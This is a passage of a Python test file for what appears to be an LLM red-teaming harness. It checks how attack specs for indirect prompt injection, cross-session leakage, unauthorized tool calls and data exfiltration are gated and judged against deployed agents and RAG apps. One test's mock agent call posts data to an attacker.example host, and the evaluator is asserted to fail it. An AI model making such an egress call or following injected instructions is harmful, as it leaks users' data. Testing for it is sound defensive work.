"""A deployed application holds a spec's scene only when its operator says so (OD-18, ADR-0009
option B, 2026-10-07).

Option A builds the scene into the request for a bare model. A deployed application (an agent, a
chatbot, a RAG app, an API) cannot be handed a spec's documents, tools or memory in the request:
its operator seeds them into the deployment. The target file says which specs are seeded and how
the deployment names the spec's tools. An unseeded spec sends nothing and is `inconclusive:
setup_not_seeded`; a seeded one goes out as the plain prompt, tagged `setup_delivery: seeded`,
and the deployment's own tool names are judged as the spec's.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest

from ildottore import safe_yaml
from ildottore.adapters.mock import MockScenario, MockTarget
from ildottore.core.runner import CampaignRunner
from ildottore.core.setup_delivery import (
    SEEDED,
    canonical_tool_calls,
    is_seeded,
    needs_seeding,
    seeding_gap,
)
from ildottore.evaluators.tool_call import ToolCallEvaluator
from ildottore.shared.digest import target_digest
from ildottore.shared.enums import TargetType, VerdictStatus
from ildottore.shared.models import (
    AttackSpec,
    Capabilities,
    EvalContext,
    EvaluatorConfig,
    ModelRequest,
    ModelResponse,
    SeededSetup,
    Target,
)

from .conftest import AllowAllPolicy, no_sleep

_SPECS = Path(__file__).resolve().parents[2] / "specs" / "attacks"
_ALL = Capabilities(tools=True, rag=True, memory=True, multimodal=True)


def _spec(spec_id: str) -> AttackSpec:
    return AttackSpec.model_validate(safe_yaml.safe_load((_SPECS / f"{spec_id}.yaml").read_text()))


def _target(seeded: SeededSetup | None = None, kind: TargetType = TargetType.AGENT) -> Target:
    return Target(id="app", type=kind, capabilities=_ALL, seeded_setup=seeded)


class Recording:
    """A deployed application that records every request and answers with ``calls``."""

    carries_tool_definitions = True
    carries_system_prompt = True

    def __init__(self, calls: list[dict[str, Any]] | None = None) -> None:
        self.id = "rec"
        self.requests: list[ModelRequest] = []
        self._calls = calls or []

    def capabilities(self) -> Capabilities:
        return _ALL

    async def send(self, request: ModelRequest) -> ModelResponse:
        self.requests.append(request)
        return ModelResponse(text="done", tool_calls=[dict(c) for c in self._calls])


async def _run(spec_id: str, adapter: Any, target: Target, fixtures):
    evaluators, mutators, scorer, (evidence, runs) = fixtures
    spec = _spec(spec_id).model_copy(update={"mutations": ["identity"]})
    runner = CampaignRunner(
        policy=AllowAllPolicy(),
        mutators=mutators,
        evaluators=evaluators,
        scorer=scorer,
        evidence_store=evidence,
        run_store=runs,
        adapter_factory=lambda _t, _s: adapter,
        endpoint_for=lambda _t, _s: "https://app.example.test/v1/chat",
        n=1,
        sleep=no_sleep,
        now=lambda: 0.0,
    )
    return await runner.run(run_id="r1", target=target, specs=[spec])


@pytest.fixture
def fixtures(evaluators, mutators, scorer, stores):
    return evaluators, mutators, scorer, stores


# --- which specs need it, and which are declared ------------------------------------------


def test_only_a_deployed_application_with_a_scene_needs_seeding() -> None:
    tool_spec = _spec("PI-INDIRECT-TOOL-001")
    assert needs_seeding(tool_spec, _target())
    assert needs_seeding(_spec("PI-INDIRECT-RAG-001"), _target(kind=TargetType.RAG))
    assert needs_seeding(_spec("DL-XSESSION-001"), _target(kind=TargetType.CHATBOT))
    assert not needs_seeding(tool_spec, _target(kind=TargetType.MODEL))  # option A's
    assert not needs_seeding(_spec("AC-DEBUG-001"), _target())  # no scene at all


def test_a_spec_is_seeded_by_its_id_or_a_glob() -> None:
    spec = _spec("PI-INDIRECT-TOOL-001")
    assert not is_seeded(spec, _target())
    assert is_seeded(spec, _target(SeededSetup(specs=["PI-INDIRECT-TOOL-001"])))
    assert is_seeded(spec, _target(SeededSetup(specs=["PI-INDIRECT-*"])))
    assert not is_seeded(spec, _target(SeededSetup(specs=["pi-indirect-*"])))  # case kept
    assert not is_seeded(spec, _target(SeededSetup(specs=["AG-*"])))


# --- the gate before sending ----------------------------------------------------------------


async def test_an_unseeded_spec_sends_nothing(fixtures) -> None:
    adapter = Recording()
    result = await _run("PI-INDIRECT-TOOL-001", adapter, _target(), fixtures)
    assert adapter.requests == []
    finding = result.findings[0]
    assert finding.status is VerdictStatus.INCONCLUSIVE
    assert finding.reasoning.startswith("setup_not_seeded")


async def test_a_seeded_spec_goes_out_plain_and_tagged(fixtures) -> None:
    adapter = Recording()
    target = _target(SeededSetup(specs=["PI-INDIRECT-*"]))
    result = await _run("PI-INDIRECT-TOOL-001", adapter, target, fixtures)
    assert len(adapter.requests) == 1
    sent = adapter.requests[0]
    assert not sent.tools  # the deployment has its own tools; none are put on the wire
    attempt = result.findings[0].attempts[0]
    assert attempt.request.metadata["setup_delivery"] == SEEDED


async def test_a_spec_without_a_scene_is_never_gated(fixtures) -> None:
    adapter = Recording()
    result = await _run("AC-DEBUG-001", adapter, _target(), fixtures)
    assert len(adapter.requests) == 1
    assert "setup_delivery" not in (result.findings[0].attempts[0].request.metadata or {})


async def test_the_offline_mock_holds_the_scene_by_construction(fixtures) -> None:
    """Its replies are the spec's own fixtures, written for the scene: gating it turned 26 fails
    of the offline demo into `setup_not_seeded`."""

    adapter = MockTarget(MockScenario(response="ok", capabilities=_ALL))
    result = await _run("PI-INDIRECT-TOOL-001", adapter, _target(), fixtures)
    finding = result.findings[0]
    assert not (finding.reasoning or "").startswith("setup_not_seeded")
    assert "setup_delivery" not in (finding.attempts[0].request.metadata or {})


# --- the deployment's tool names, judged as the spec's ---------------------------------------


def test_a_mapped_call_is_renamed_in_either_shape() -> None:
    target = _target(SeededSetup(tools={"search_kb": "kb.search", "send_email": "mail_send"}))
    response = ModelResponse(
        text="",
        tool_calls=[
            {"id": "a", "name": "kb.search", "arguments": {"q": "returns"}},
            {"id": "b", "type": "function", "function": {"name": "mail_send", "arguments": "{}"}},
            {"id": "c", "name": "unmapped", "arguments": {}},
        ],
    )
    renamed = canonical_tool_calls(response, target, _spec("AG-TOOL-UNAUTH-001"))
    assert renamed.tool_calls[0] == {"id": "a", "name": "search_kb", "arguments": {"q": "returns"}}
    assert renamed.tool_calls[1]["function"] == {"name": "send_email", "arguments": "{}"}
    assert renamed.tool_calls[2]["name"] == "unmapped"
    assert response.tool_calls[0]["name"] == "kb.search"  # the original is left as made


def test_without_a_map_the_response_is_the_same_object() -> None:
    response = ModelResponse(text="", tool_calls=[{"name": "x", "arguments": {}}])
    spec = _spec("AG-TOOL-UNAUTH-001")
    assert canonical_tool_calls(response, _target(), spec) is response
    assert canonical_tool_calls(response, _target(SeededSetup(specs=["*"])), spec) is response


async def _tool_verdict(
    calls: list[dict[str, Any]], seeded: SeededSetup, spec_id: str = "AG-TOOL-UNAUTH-001"
) -> Any:
    spec = _spec(spec_id)
    config = next(e for e in spec.evaluators if e.type.value == "tool_call")
    target = _target(seeded)
    response = canonical_tool_calls(ModelResponse(text="", tool_calls=calls), target, spec)
    ctx = EvalContext(
        spec=spec,
        request=ModelRequest(prompt="p"),
        response=response,
        config=EvaluatorConfig.model_validate(config.model_dump()),
        granted_tools=seeded.granted_tools,
    )
    return await ToolCallEvaluator().evaluate(ctx)


async def test_a_deployment_name_for_an_allowed_tool_is_not_unauthorized() -> None:
    call = [{"id": "a", "name": "kb.search", "arguments": {"q": "returns"}}]
    unmapped = await _tool_verdict(call, SeededSetup(specs=["*"]))
    mapped = await _tool_verdict(call, SeededSetup(specs=["*"], tools={"search_kb": "kb.search"}))
    assert unmapped.status is VerdictStatus.FAIL  # the false fail the map exists to remove
    assert mapped.status is VerdictStatus.PASS


async def test_a_deployment_name_for_a_forbidden_tool_still_fails() -> None:
    call = [{"id": "a", "name": "mail.send", "arguments": {"to": "x@example.com"}}]
    verdict = await _tool_verdict(call, SeededSetup(specs=["*"], tools={"send_email": "mail.send"}))
    assert verdict.status is VerdictStatus.FAIL
    assert "send_email" in (verdict.reasoning or "")


async def test_a_granted_tool_is_not_unauthorized_but_what_it_carries_is_judged() -> None:
    granted = SeededSetup(specs=["*"], granted_tools=["escalate", "purge_cache"])
    plain = await _tool_verdict([{"name": "escalate", "arguments": {"to": "tier2"}}], granted)
    assert plain.status is VerdictStatus.PASS
    destructive = await _tool_verdict([{"name": "purge_cache", "arguments": {}}], granted)
    assert destructive.status is VerdictStatus.FAIL
    assert "without confirmation" in (destructive.reasoning or "")


async def test_the_runner_judges_the_spec_name_and_stores_the_deployment_name(fixtures) -> None:
    async def status(tools: dict[str, str]) -> tuple[VerdictStatus, str]:
        adapter = Recording([{"id": "a", "name": "kb.search", "arguments": {"q": "returns"}}])
        seeded = SeededSetup(specs=["AG-TOOL-UNAUTH-001"], tools=tools)
        result = await _run("AG-TOOL-UNAUTH-001", adapter, _target(seeded), fixtures)
        attempt = result.findings[0].attempts[0]
        assert attempt.response is not None and attempt.verdict is not None
        return attempt.verdict.status, attempt.response.tool_calls[0]["name"]

    assert await status({}) == (VerdictStatus.FAIL, "kb.search")  # unmapped: "unauthorized"
    mapped, stored = await status({"search_kb": "kb.search"})
    assert mapped is not VerdictStatus.FAIL  # judged as search_kb, an allowed tool
    assert stored == "kb.search"  # the evidence keeps the call as the deployment made it


# --- the target file --------------------------------------------------------------------------


def _load(tmp_path: Path, body: str, kind: str = "agent") -> Target:
    from ildottore.cli.wiring import load_target

    path = tmp_path / "target.yaml"
    path.write_text(f"id: app\ntype: {kind}\nendpoint: https://app.example.test/v1\n{body}")
    return load_target(path)


def test_the_target_file_declares_what_is_seeded(tmp_path: Path) -> None:
    target = _load(
        tmp_path,
        "seeded_setup:\n"
        "  specs: [PI-INDIRECT-TOOL-001, 'AG-*']\n"
        "  tools: {lookup_ticket: get_ticket}\n"
        "  granted_tools: [escalate]\n",
    )
    assert target.seeded_setup == SeededSetup(
        specs=["PI-INDIRECT-TOOL-001", "AG-*"],
        tools={"lookup_ticket": "get_ticket"},
        granted_tools=["escalate"],
    )
    assert _load(tmp_path, "").seeded_setup is None


@pytest.mark.parametrize(
    ("body", "kind", "message"),
    [
        ("seeded_setup: {specs: ['*']}\n", "model", "in-band"),
        ("seeded_setup: [PI-INDIRECT-TOOL-001]\n", "agent", "must be a mapping"),
        ("seeded_setup: {spec: ['*']}\n", "agent", "unknown key"),
        ("seeded_setup: {specs: PI-INDIRECT-TOOL-001}\n", "agent", "list of spec ids"),
        ("seeded_setup: {specs: ['']}\n", "agent", "list of spec ids"),
        ("seeded_setup: {tools: {lookup_ticket: 3}}\n", "agent", "map each spec tool"),
        ("seeded_setup: {run_token: short}\n", "agent", "run_token"),
        ("seeded_setup: {run_token: 'has space in it'}\n", "agent", "run_token"),
        ("seeded_setup: {granted_tools: escalate}\n", "agent", "granted_tools"),
        ("seeded_setup: {tools: {a: x}, granted_tools: [x]}\n", "agent", "both maps and grants"),
    ],
)
def test_a_wrong_declaration_is_refused(tmp_path: Path, body: str, kind: str, message: str) -> None:
    with pytest.raises(ValueError, match=message):
        _load(tmp_path, body, kind)


# --- what it costs, and what a stored run is compared with ------------------------------------


def test_the_estimate_counts_only_what_will_be_sent() -> None:
    from ildottore.cli.run import estimate_plan

    tool_spec, plain = _spec("PI-INDIRECT-TOOL-001"), _spec("AC-DEBUG-001")
    one = {tool_spec.id: ["identity"], plain.id: ["identity"]}
    specs = [tool_spec, plain]

    def requests(target: Target, **kwargs: Any) -> int:
        return estimate_plan(specs, 5, mutators_by_spec=one, target=target, **kwargs).requests

    assert requests(_target()) == 5  # the tool spec is not seeded: it sends nothing
    assert requests(_target(SeededSetup(specs=["PI-*"]))) == 10  # one plain send each
    assert requests(_target(), fixtures_hold_scene=True) == 10  # the offline mock


def test_a_stored_run_without_the_block_keeps_its_digest() -> None:
    """Absent, the field is left out of the digest, so a run stored before it existed resumes:
    the digest is the one computed from a dump that never had the field."""

    from ildottore.shared import digest

    plain = _target()
    before = {
        k: v
        for k, v in plain.model_dump(mode="json").items()
        if k not in digest._TARGET_COSMETIC and k not in ("seeded_setup", "websocket")
    }
    before["__route__"] = "live"
    assert target_digest(plain) == digest._sha(before)
    assert target_digest(plain) != target_digest(_target(SeededSetup(specs=["*"])))


# --- the command line ---------------------------------------------------------------------------

_REPO = Path(__file__).resolve().parents[2]


def _cli(*args: str):  # type: ignore[no-untyped-def]
    from typer.testing import CliRunner

    from ildottore.cli.app import app

    return CliRunner().invoke(app, list(args))


def test_the_worked_example_says_what_it_will_not_send() -> None:
    """examples/README.md, Scenario G, prints this exact plan."""

    result = _cli(
        "run",
        "--dry-run",
        "-vv",
        "--spec",
        "PI-INDIRECT-*",
        "--spec",
        "AG-TOOL-*",
        "-t",
        str(_REPO / "examples" / "target.app.yaml"),
        "--scope",
        str(_REPO / "examples" / "scope.app.yaml"),
    )
    assert result.exit_code == 0, result.output
    assert "not seeded: 1 spec(s) on support-agent-staging" in result.output
    assert "- PI-INDIRECT-RAG-001: setup_not_seeded" in result.output
    assert "would send: 20 requests over 2 specs at runs=5" in result.output


def test_a_target_where_only_unseeded_specs_remain_is_refused(tmp_path: Path) -> None:
    target = tmp_path / "target.yaml"
    target.write_text(
        (_REPO / "examples" / "target.app.yaml").read_text().split("seeded_setup:")[0]
    )
    result = _cli(
        "run",
        "--dry-run",
        "--spec",
        "PI-INDIRECT-RAG-001",
        "-t",
        str(target),
        "--scope",
        str(_REPO / "examples" / "scope.app.yaml"),
    )
    assert result.exit_code != 0
    assert "nothing would be sent" in result.output
    assert "1 not seeded" in result.output
    assert "its id in seeded_setup.specs" in result.output


# --- the pre-commit audit of B (2026-10-07) ---------------------------------------------------


def test_a_scene_with_a_per_run_canary_needs_a_run_token() -> None:
    """The operator seeds before the run, so a canary bound per run could never be in the
    deployment and secret_leakage would be blind (H1)."""

    spec = _spec("DL-XSESSION-001")
    declared = _target(SeededSetup(specs=["DL-*"]), kind=TargetType.CHATBOT)
    gap = seeding_gap(spec, declared)
    assert gap is not None and "run_token" in gap
    tokened = _target(SeededSetup(specs=["DL-*"], run_token="eng-2026-q4"), TargetType.CHATBOT)
    assert seeding_gap(spec, tokened) is None


async def test_the_run_token_is_the_canary_the_evaluators_look_for(fixtures) -> None:
    class Leaky(Recording):
        async def send(self, request: ModelRequest) -> ModelResponse:
            self.requests.append(request)
            return ModelResponse(
                text="The previous user's note was ZYNAP_CANARY_eng-2026-q4-DL-XSESSION-001."
            )

    target = _target(
        SeededSetup(specs=["DL-XSESSION-001"], run_token="eng-2026-q4"), TargetType.CHATBOT
    )
    adapter = Leaky()
    result = await _run("DL-XSESSION-001", adapter, target, fixtures)
    assert len(adapter.requests) == 1
    assert result.findings[0].attempts[0].verdict.status is VerdictStatus.FAIL


async def test_a_seeded_request_carries_no_scene(fixtures) -> None:
    """The deployment holds the documents and the memory; nothing of them goes on the wire."""

    adapter = Recording()
    target = _target(
        SeededSetup(specs=["DL-XSESSION-001"], run_token="eng-2026-q4"), TargetType.CHATBOT
    )
    await _run("DL-XSESSION-001", adapter, target, fixtures)
    sent = adapter.requests[0]
    assert "Saved memory" not in (sent.system_prompt or "")
    assert not sent.messages and not sent.tools
    assert "ZYNAP_CANARY" not in sent.prompt


async def test_a_grant_never_authorizes_a_tool_of_the_specs_own_scene() -> None:
    """Granting `http_post` re-authorized the egress AG-EXFIL-EGRESS-001 forbids (H2)."""

    call = [{"name": "http_post", "arguments": {"url": "https://attacker.example/x"}}]
    granted = SeededSetup(specs=["*"], granted_tools=["http_post"])
    verdict = await _tool_verdict(call, granted, "AG-EXFIL-EGRESS-001")
    assert verdict.status is VerdictStatus.FAIL


async def test_the_runner_passes_the_grants_to_the_evaluators(fixtures) -> None:
    adapter = Recording([{"id": "a", "name": "escalate_to_human", "arguments": {}}])

    async def status(granted: list[str]) -> VerdictStatus:
        target = _target(SeededSetup(specs=["AG-TOOL-UNAUTH-001"], granted_tools=granted))
        result = await _run("AG-TOOL-UNAUTH-001", adapter, target, fixtures)
        verdict = result.findings[0].attempts[0].verdict
        assert verdict is not None
        return verdict.status

    assert await status([]) is VerdictStatus.FAIL
    assert await status(["escalate_to_human"]) is not VerdictStatus.FAIL


def test_the_tool_map_is_applied_per_spec() -> None:
    """A target-wide map renamed get_ticket to lookup_ticket inside a spec that calls it
    read_ticket, a name neither the spec nor the deployment uses (M1)."""

    seeded = SeededSetup(
        specs=["*"], tools={"lookup_ticket": "get_ticket", "read_ticket": "get_ticket"}
    )
    call = ModelResponse(text="", tool_calls=[{"name": "get_ticket", "arguments": {}}])
    target = _target(seeded)
    drift = canonical_tool_calls(call, target, _spec("AG-AUTONOMY-DRIFT-001"))
    tool = canonical_tool_calls(call, target, _spec("PI-INDIRECT-TOOL-001"))
    assert drift.tool_calls[0]["name"] == "read_ticket"
    assert tool.tool_calls[0]["name"] == "lookup_ticket"


def test_two_tools_of_one_scene_under_one_name_are_refused_for_that_spec() -> None:
    clash = _target(
        SeededSetup(specs=["*"], tools={"search_kb": "lookup", "get_weather": "lookup"})
    )
    gap = seeding_gap(_spec("AG-TOOL-UNAUTH-001"), clash)
    assert gap is not None and "get_weather, search_kb" in gap
    assert seeding_gap(_spec("PI-INDIRECT-TOOL-001"), clash) is None


def test_every_name_key_of_a_call_is_renamed() -> None:
    """A call with a top-level name and a function.name had only the second renamed, while the
    evaluators read the first (L1)."""

    target = _target(SeededSetup(tools={"search_kb": "kb.search"}))
    both = ModelResponse(
        text="",
        tool_calls=[{"name": "kb.search", "function": {"name": "kb.search", "arguments": "{}"}}],
    )
    renamed = canonical_tool_calls(both, target, _spec("AG-TOOL-UNAUTH-001")).tool_calls[0]
    assert renamed["name"] == "search_kb" and renamed["function"]["name"] == "search_kb"


async def test_a_seeded_carrier_never_called_is_not_a_pass(fixtures) -> None:
    """A deployment that runs its tools server-side, or a REST template, shows no call: its
    plain answer passed where option A reports setup_not_reached (M3)."""

    seeded = SeededSetup(specs=["PI-INDIRECT-TOOL-001"], tools={"lookup_ticket": "get_ticket"})
    silent = await _run("PI-INDIRECT-TOOL-001", Recording(), _target(seeded), fixtures)
    verdict = silent.findings[0].attempts[0].verdict
    assert verdict is not None and verdict.status is VerdictStatus.INCONCLUSIVE
    assert verdict.reasoning.startswith("setup_not_reached")
    called = await _run(
        "PI-INDIRECT-TOOL-001",
        Recording([{"id": "a", "name": "get_ticket", "arguments": {"id": 4831}}]),
        _target(seeded),
        fixtures,
    )
    attempt = called.findings[0].attempts[0]
    assert not (attempt.verdict.reasoning or "").startswith("setup_not_reached")
    assert attempt.request.metadata["seeded_tools"] == {"get_ticket": "lookup_ticket"}


async def test_every_offline_mock_holds_the_scene(fixtures) -> None:
    """The plan exempted the `comprehending` route and the run did not (M2)."""

    from ildottore.adapters.comprehending import ComprehendingMock

    adapter = ComprehendingMock(id="app", capabilities=_ALL)
    result = await _run("PI-INDIRECT-TOOL-001", adapter, _target(), fixtures)
    assert not (result.findings[0].reasoning or "").startswith("setup_not_seeded")


async def test_a_resumed_spec_keeps_what_the_stored_run_sent(fixtures) -> None:
    """A run stored before the gate sent this spec; resuming it must not swap a scored finding
    for "nothing was sent" (L3)."""

    adapter = Recording()
    first = await _run("PI-INDIRECT-TOOL-001", adapter, _target(SeededSetup(specs=["*"])), fixtures)
    evaluators, mutators, scorer, (evidence, runs) = fixtures
    runner = CampaignRunner(
        policy=AllowAllPolicy(),
        mutators=mutators,
        evaluators=evaluators,
        scorer=scorer,
        evidence_store=evidence,
        run_store=runs,
        adapter_factory=lambda _t, _s: adapter,
        endpoint_for=lambda _t, _s: "https://app.example.test/v1/chat",
        n=1,
        sleep=no_sleep,
        now=lambda: 0.0,
    )
    spec = _spec("PI-INDIRECT-TOOL-001").model_copy(update={"mutations": ["identity"]})
    resumed = await runner.run(run_id="r1", target=_target(), specs=[spec], resume_from=first.run)
    assert resumed.findings[0].attempts == first.findings[0].attempts


async def test_a_gated_prior_whose_reply_was_not_judged_is_not_scored(fixtures) -> None:
    """A reply stored without a verdict (a ceiling stopped its evaluation) is not a finished
    attempt: the gate keeps it as evidence instead of scoring the spec over no verdict."""

    adapter = Recording()
    first = await _run("PI-INDIRECT-TOOL-001", adapter, _target(SeededSetup(specs=["*"])), fixtures)
    stored = first.findings[0]
    unjudged = stored.model_copy(
        update={"attempts": [a.model_copy(update={"verdict": None}) for a in stored.attempts]}
    )
    evaluators, mutators, scorer, (evidence, runs) = fixtures
    runner = CampaignRunner(
        policy=AllowAllPolicy(),
        mutators=mutators,
        evaluators=evaluators,
        scorer=scorer,
        evidence_store=evidence,
        run_store=runs,
        adapter_factory=lambda _t, _s: adapter,
        endpoint_for=lambda _t, _s: "https://app.example.test/v1/chat",
        n=1,
        sleep=no_sleep,
        now=lambda: 0.0,
    )
    spec = _spec("PI-INDIRECT-TOOL-001").model_copy(update={"mutations": ["identity"]})
    prior = first.run.model_copy(update={"findings": [unjudged]})
    resumed = await runner.run(run_id="r1", target=_target(), specs=[spec], resume_from=prior)
    reasoning = resumed.findings[0].reasoning or ""
    assert "had sent 1 of 1 attempts" in reasoning and "not scored" in reasoning


def test_the_discovery_plan_counts_what_is_not_seeded(tmp_path: Path) -> None:
    result = _cli(
        "run",
        "-sn",
        "--spec",
        "PI-INDIRECT-*",
        "-t",
        str(_REPO / "examples" / "target.app.yaml"),
        "--scope",
        str(_REPO / "examples" / "scope.app.yaml"),
    )
    assert result.exit_code == 0, result.output
    assert "1 not seeded" in result.output


def test_a_changed_declaration_refuses_the_resume_and_says_so(tmp_path: Path) -> None:
    from ildottore.cli.run import execute_run
    from tests.cli.test_resume_integrity import _halted_run, _opts, _specs

    spec_dir = _specs(tmp_path)
    run_id = _halted_run(tmp_path, spec_dir)
    changed = _opts(tmp_path, spec_dir, resume=run_id, budget_requests=100)
    target = changed.targets[0]
    target.write_text(target.read_text() + "seeded_setup:\n  specs: ['*']\n")
    with pytest.raises(ValueError, match="seeded_setup differ"):
        execute_run(changed, [spec_dir])


# --- delta audit of B (2026-10-07) -------------------------------------------------------------


def test_each_seeded_spec_gets_its_own_canary_to_seed() -> None:
    """One token for all made every seeded spec's canary the same, so a reply quoting one
    spec's seeded record failed another (D-M1); a spec whose canary travels in the request keeps
    the per-run one."""

    from ildottore.core.setup_delivery import canary_binding, seeded_canaries

    target = _target(SeededSetup(specs=["*"], run_token="eng-2026-q4"), TargetType.RAG)
    xsession = _spec("DL-XSESSION-001")
    assert canary_binding(xsession, target, "run-1") == "eng-2026-q4-DL-XSESSION-001"
    assert seeded_canaries(xsession, target) == ["ZYNAP_CANARY_eng-2026-q4-DL-XSESSION-001"]
    rag = _spec("PI-INDIRECT-RAG-001")
    assert canary_binding(rag, target, "run-1") == "run-1"
    assert seeded_canaries(rag, target) == []


def test_a_canary_planted_outside_the_scene_needs_a_token_too() -> None:
    """AC-BOLA-001 plants its canary in another customer's record (`setup.canaries`), not in
    documents, tools or memory, and was sent with a canary nobody could plant (D-H2)."""

    from ildottore.core.setup_delivery import needs_run_token

    assert needs_run_token(_spec("AC-BOLA-001"))
    assert not needs_run_token(_spec("PI-INDIRECT-TOOL-001"))  # its canary is in the prompt
    gap = seeding_gap(_spec("AC-BOLA-001"), _target(SeededSetup(specs=["*"])))
    assert gap is not None and "run_token" in gap


async def test_an_untokened_canary_spec_is_never_sent(fixtures) -> None:
    """The gate is asked before binding: a runner that asked after it sent this spec while the
    plan said "not seeded" (mutation N15 of the delta audit)."""

    adapter = Recording()
    target = _target(SeededSetup(specs=["DL-XSESSION-001"]), TargetType.CHATBOT)
    result = await _run("DL-XSESSION-001", adapter, target, fixtures)
    assert adapter.requests == []
    assert "run_token" in (result.findings[0].reasoning or "")


async def test_a_trace_spec_is_not_sent_through_an_adapter_without_tool_calls(fixtures) -> None:
    """A REST template reads no tool calls, so AG-TOOL-UNAUTH-001 could only ever pass there
    (D-M3)."""

    class Rest(Recording):
        returns_tool_calls = False

    adapter = Rest()
    target = _target(SeededSetup(specs=["*"]))
    result = await _run("AG-TOOL-UNAUTH-001", adapter, target, fixtures)
    assert adapter.requests == []
    assert (result.findings[0].reasoning or "").startswith("setup_not_delivered")
    plain = await _run("PI-INDIRECT-TOOL-001", Rest(), target, fixtures)
    assert plain.findings[0].attempts  # no trace evaluator: sent, then judged on reach


async def test_the_seeded_reach_verdict_says_what_it_could_not_see(fixtures) -> None:
    seeded = SeededSetup(specs=["PI-INDIRECT-TOOL-001"])
    result = await _run("PI-INDIRECT-TOOL-001", Recording(), _target(seeded), fixtures)
    verdict = result.findings[0].attempts[0].verdict
    assert verdict is not None
    assert "the deployment's reply shows no call to those tools" in verdict.reasoning


async def test_a_partial_prior_is_kept_but_not_published_as_a_result(fixtures) -> None:
    """The resume placeholder is unscored; a partial one published as final broke F11 (D-H1)."""

    from ildottore.shared.models import Finding

    adapter = Recording()
    first = await _run("PI-INDIRECT-TOOL-001", adapter, _target(SeededSetup(specs=["*"])), fixtures)
    done = first.findings[0]
    evaluators, mutators, scorer, (evidence, runs) = fixtures
    runner = CampaignRunner(
        policy=AllowAllPolicy(),
        mutators=mutators,
        evaluators=evaluators,
        scorer=scorer,
        evidence_store=evidence,
        run_store=runs,
        adapter_factory=lambda _t, _s: adapter,
        endpoint_for=lambda _t, _s: "https://app.example.test/v1/chat",
        n=2,  # two planned attempts; the stored run holds one
        sleep=no_sleep,
        now=lambda: 0.0,
    )
    placeholder = Finding(
        spec_id=done.spec_id,
        target_id=done.target_id,
        status=VerdictStatus.INCONCLUSIVE,
        risk=done.risk,
        confirmed=False,
        attempts=done.attempts,
        evidence=done.evidence,
    )
    stored = first.run.model_copy(update={"findings": [placeholder]})
    spec = _spec("PI-INDIRECT-TOOL-001").model_copy(update={"mutations": ["identity"]})
    sent_before = len(adapter.requests)
    resumed = await runner.run(run_id="r1", target=_target(), specs=[spec], resume_from=stored)
    finding = resumed.findings[0]
    assert len(adapter.requests) == sent_before  # nothing more was sent
    assert finding.status is VerdictStatus.INCONCLUSIVE
    assert finding.attempts == done.attempts
    assert "1 of 2 attempts" in (finding.reasoning or "")


def test_the_plan_counts_an_untokened_canary_spec_as_not_seeded(tmp_path: Path) -> None:
    """The plan asks the token question too (mutation N12 of the delta audit)."""

    target = tmp_path / "target.yaml"
    text = (_REPO / "examples" / "target.app.yaml").read_text()
    target.write_text(text.split("seeded_setup:")[0] + "seeded_setup:\n  specs: ['*']\n")
    result = _cli(
        "run",
        "--dry-run",
        "-vv",
        "--spec",
        "AC-BOLA-001",
        "--spec",
        "PI-INDIRECT-TOOL-001",
        "-t",
        str(target),
        "--scope",
        str(_REPO / "examples" / "scope.app.yaml"),
    )
    assert result.exit_code == 0, result.output
    assert "- AC-BOLA-001: setup_not_seeded" in result.output
    assert "run_token" in result.output


# --- third audit round of B (2026-10-07) -------------------------------------------------------


async def test_a_complete_prior_comes_back_as_the_verdict_it_was(fixtures) -> None:
    """The resume placeholder is unscored; a prior holding every planned attempt is scored again,
    so a stored confirmed fail stays a fail (the main path of D-H1, mutation G1)."""

    from ildottore.shared.models import Finding

    class Leaky(Recording):
        async def send(self, request: ModelRequest) -> ModelResponse:
            self.requests.append(request)
            return ModelResponse(text="The configuration token is ZYNAP_CANARY_r1.")

    adapter = Leaky()
    first = await _run("PI-INDIRECT-TOOL-001", adapter, _target(SeededSetup(specs=["*"])), fixtures)
    done = first.findings[0]
    assert done.status is VerdictStatus.FAIL
    placeholder = Finding(
        spec_id=done.spec_id,
        target_id=done.target_id,
        status=VerdictStatus.INCONCLUSIVE,
        risk=done.risk,
        confirmed=False,
        attempts=done.attempts,
        evidence=done.evidence,
    )
    stored = first.run.model_copy(update={"findings": [placeholder]})
    evaluators, mutators, scorer, (evidence, runs) = fixtures
    runner = CampaignRunner(
        policy=AllowAllPolicy(),
        mutators=mutators,
        evaluators=evaluators,
        scorer=scorer,
        evidence_store=evidence,
        run_store=runs,
        adapter_factory=lambda _t, _s: adapter,
        endpoint_for=lambda _t, _s: "https://app.example.test/v1/chat",
        n=1,
        sleep=no_sleep,
        now=lambda: 0.0,
    )
    spec = _spec("PI-INDIRECT-TOOL-001").model_copy(update={"mutations": ["identity"]})
    sent = len(adapter.requests)
    resumed = await runner.run(run_id="r1", target=_target(), specs=[spec], resume_from=stored)
    finding = resumed.findings[0]
    assert len(adapter.requests) == sent
    assert finding.status is VerdictStatus.FAIL
    assert finding.risk.band == done.risk.band
    assert finding.confirmed == done.confirmed


def test_the_adapters_without_tool_calls_say_so() -> None:
    """The runner reads the attribute and the plan reads the provider; both must hold
    (mutations T4 and T5)."""

    from ildottore.adapters.mcp import MCPAdapter
    from ildottore.adapters.rest import RestAdapter
    from ildottore.cli.wiring import provider_returns_tool_calls

    assert RestAdapter.returns_tool_calls is False
    assert MCPAdapter.returns_tool_calls is False
    for provider, visible in (
        ("openai", True),
        ("anthropic", True),
        ("rest", False),
        ("mcp", False),
    ):
        target = Target(id="t", type=TargetType.AGENT, provider=provider)
        assert provider_returns_tool_calls(target) is visible


def test_the_plan_does_not_count_a_trace_spec_through_rest(tmp_path: Path) -> None:
    """Mutation T3: the plan assumed every adapter shows tool calls."""

    target = tmp_path / "target.yaml"
    text = (_REPO / "examples" / "target.app.yaml").read_text()
    target.write_text(text.replace("provider: openai", "provider: rest"))
    result = _cli(
        "run",
        "--dry-run",
        "-vv",
        "--spec",
        "AG-TOOL-UNAUTH-001",
        "--spec",
        "PI-INDIRECT-TOOL-001",
        "-t",
        str(target),
        "--scope",
        str(_REPO / "examples" / "scope.app.yaml"),
    )
    assert result.exit_code == 0, result.output
    assert "- AG-TOOL-UNAUTH-001: setup_not_delivered" in result.output
    assert "would send: 15 requests over 1 specs" in result.output


def test_a_gated_prior_is_not_counted_as_exercised() -> None:
    """Its attempts carry replies from a run stored before the gate; they are not scored."""

    from ildottore.core.runner import _zero_risk
    from ildottore.reporting.summary import _build_coverage
    from ildottore.shared.models import Attempt, Finding

    spec = _spec("PI-INDIRECT-TOOL-001")
    attempt = Attempt(
        attempt_id="a",
        spec_id=spec.id,
        request=ModelRequest(prompt="p"),
        response=ModelResponse(text="done"),
    )
    risk = _zero_risk(spec)
    finding = Finding(
